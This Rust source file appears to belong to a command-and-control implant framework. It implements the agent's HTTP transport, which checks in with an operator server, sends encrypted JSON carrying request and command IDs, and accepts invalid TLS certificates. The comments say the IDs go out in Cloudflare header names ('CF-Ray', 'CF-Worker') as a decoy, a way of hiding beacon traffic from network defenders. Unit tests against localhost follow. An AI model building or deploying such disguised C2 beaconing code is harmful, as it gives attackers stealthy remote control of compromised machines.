use std::error::Error;

use bytes::Bytes;
use reqwest::{Client, ClientBuilder};
use serde::de::DeserializeOwned;
use serde::Serialize;

use rs2_communication_protocol::encryptor::Encryptor;
use rs2_communication_protocol::metadata::{Metadata, WithMetadata};
use rs2_communication_protocol::protocol::Protocol;
use rs2_communication_protocol::sender::Sender;

/// Define the JSON protocol for sending and receiving data.
pub struct JsonProtocol {
    /// The HTTP client used to send requests. This is an instance of the reqwest crate.
    /// It is configured to accept invalid certificates, use a maximum of 2 idle connections per host,
    /// and have a timeout of 30 seconds.
    /// It's also forced to uses the rustls TLS backend.
    ///
    /// Initiating a client allows for the creation of keep-alive connections, which can be reused
    /// for multiple requests, reducing the overhead of establishing a new connection for each
    /// request and improving performance.
    client: Client,
    /// A flag indicating whether the protocol is used for checkin.
    /// This is used to determine whether the checkin endpoint should be appended to the URL.
    /// It's automatically reset to false after each request.
    is_checkin: bool,
    /// The base URL for the protocol. This is the URL to which requests are sent.
    base_url: String,
    /// The global encryptor used to encrypt and decrypt data.
    /// This is used only if an encryptor is not provided when sending or receiving data.
    /// If no encryptor is provided, the global encryptor is used to encrypt and decrypt data as fallback;
    /// if the global encryptor is not set, data is sent and received without encryption.
    global_encryptor: Option<Box<dyn Encryptor>>,
}

unsafe impl Send for JsonProtocol {}

impl JsonProtocol {
    /// Create a new JSON protocol.
    pub fn new(base_url: String) -> Self {
        JsonProtocol {
            client: ClientBuilder::new()
                .danger_accept_invalid_certs(true)
                .pool_max_idle_per_host(2)
                .timeout(std::time::Duration::from_secs(30))
                .use_rustls_tls()
                .build()
                .unwrap(),
            is_checkin: false,
            base_url,
            global_encryptor: None,
        }
    }

    /// Set the global encryptor used to encrypt and decrypt data.
    pub fn set_global_encryptor(&mut self, encryptor: Option<Box<dyn Encryptor>>) -> &Self {
        self.global_encryptor = encryptor;

        self
    }

    /// Get the encryptor to use for encryption or decryption, falling back to the global encryptor
    /// if necessary.
    fn encryptor_or_global<'a, E>(&'a self, encryptor: Option<&'a E>) -> Option<&'a dyn Encryptor>
        where E: Encryptor {
        encryptor.map(|e| e as &dyn Encryptor).or(
            if let Some(encryptor) = self.global_encryptor.as_ref() {
                Some(encryptor.as_ref())
            } else {
                None
            }
        )
    }
}

impl Sender for JsonProtocol {
    fn set_is_checkin(&mut self, is_checkin: bool) -> &Self {
        self.is_checkin = is_checkin;

        self
    }

    async fn send(&mut self, data: Bytes, metadata: Metadata) -> Result<Bytes, Box<dyn Error>> {
        let mut url = self.base_url.clone();

        // Ensure the URL ends with a slash.
        if !url.ends_with('/') {
            url.push('/');
        }

        // Append the checkin endpoint to the URL if necessary
        if self.is_checkin {
            url.push_str("checkin/");
        }

        // Append the path to the URL if it is provided.
        if let Some(ref path) = metadata.path {
            url.push_str(&path);
        }

        // Reset the checkin flag after each request, here the request has not been sent yet but
        // the flag is reset to avoid it being set for the next request in case of errors.
        self.set_is_checkin(false);

        #[cfg(test)] {
            use rs2_communication_protocol::sender::terminal_sender::TerminalSender;
            TerminalSender::new().send(data.clone(), metadata.clone()).await?;
            return Ok(data);
        }
        #[cfg(not(test))] {
            let response = self.client.post(&url)
                .body(data.to_vec())
                .header("Content-Type", "text/plain")
                // Add the request ID to the headers. Borrowed the cloudflare header name for decoy.
                .header("CF-Ray", metadata.request_id.to_string())
                // Add the command ID to the headers. Borrowed the cloudflare header name for decoy.
                .header("CF-Worker", metadata.command_id.to_string())
                .send()
                .await?;

            Ok(response.bytes().await?)
        }
    }
}

impl Protocol for JsonProtocol {
    fn read<S, E>(&self, data: Bytes, encryptor: Option<E>) -> Result<S, Box<dyn Error>>
        where S: DeserializeOwned,
              E: Encryptor {
        // Use the global encryptor if an encryptor is not provided.
        let encryptor = self.encryptor_or_global(encryptor.as_ref());

        // Decrypt the data if an encryptor is provided.
        let data = if let Some(encryptor) = encryptor {
            encryptor.decrypt(data)?
        } else {
            data
        };

        serde_json::from_slice(data.iter().as_slice()).map_err(|e| e.into())
    }

    async fn write<D, E>(&mut self, data: D, encryptor: Option<E>) -> Result<Bytes, Box<dyn Error>>
        where D: Serialize + WithMetadata + Send,
              E: Encryptor + Send {
        let metadata = data.get_metadata();
        let data = Bytes::from(serde_json::to_vec(&data)?);

        // Use the global encryptor if an encryptor is not provided.
        let encryptor = self.encryptor_or_global(encryptor.as_ref());

        // Encrypt the data if an encryptor is provided.
        let data = if let Some(encryptor) = encryptor {
            encryptor.encrypt(data)?
        } else {
            data
        };

        self.send(data, metadata).await
    }
}

#[cfg(test)]
mod tests {
    use std::future::Future;
    use std::io;
    use std::sync::{Arc, Mutex};

    use serde::Deserialize;
    use uuid::uuid;

    use rs2_communication_protocol::encryptor::ident_encryptor::IdentEncryptor;

    use super::*;

    /// Capture the output of a closure that writes to stdout.
    async fn capture_stdout<F: Future + Send + 'static>(f: F) -> String {
        // Mutex to capture the output.
        let output = Arc::new(Mutex::new(Vec::new()));
        let output_clone = output.clone();

        // Redirect stdout to our output mutex.
        let old_stdout = io::set_output_capture(Some(output.clone()));

        let handle = tokio::spawn(async move {
            f.await;
        });
        handle.await.unwrap();

        // Restore the original stdout.
        io::set_output_capture(old_stdout);

        // Collect the output and convert it to a String.
        let output = output_clone.lock().unwrap();
        String::from_utf8_lossy(&output).to_string()
    }

    #[derive(Serialize, Deserialize)]
    struct SampleData {
        foo: String,
    }

    impl WithMetadata for SampleData {
        fn get_metadata(&self) -> Metadata {
            Metadata {
                request_id: uuid!("00000000-0000-0000-0000-000000000000"),
                command_id: uuid!("00000000-0000-0000-0000-000000000000"),
                path: None,
            }
        }
    }

    #[test]
    fn test_read() {
        let protocol = JsonProtocol::new("http://localhost:8080".to_string());
        let encryptor = IdentEncryptor;
        let data = Bytes::from("{\"foo\":\"bar\"}");
        let result = protocol.read::<SampleData, _>(data, Some(encryptor));
        assert!(result.is_ok());
        let value = result.unwrap();
        assert_eq!(value.foo, "bar");
    }

    #[tokio::test]
    async fn test_write() {
        let mut protocol = JsonProtocol::new("http://localhost:8080".to_string());
        let encryptor = IdentEncryptor;
        let data = SampleData { foo: "bar".to_string() };

        let output = capture_stdout(async move {
            let result = protocol.write(data, Some(encryptor)).await;
            assert!(result.is_ok());
        }).await;

        assert_eq!(output, "[123, 34, 102, 111, 111, 34, 58, 34, 98, 97, 114, 34, 125]\n");

        // Print the output for debugging.
        println!("Output: {}", output.trim()
            .trim_matches(['[', ']'])
            .split(',')
            .map(|s| char::from_u32(s.trim().parse::<u32>().unwrap()).unwrap())
            .collect::<String>()
        );
    }
}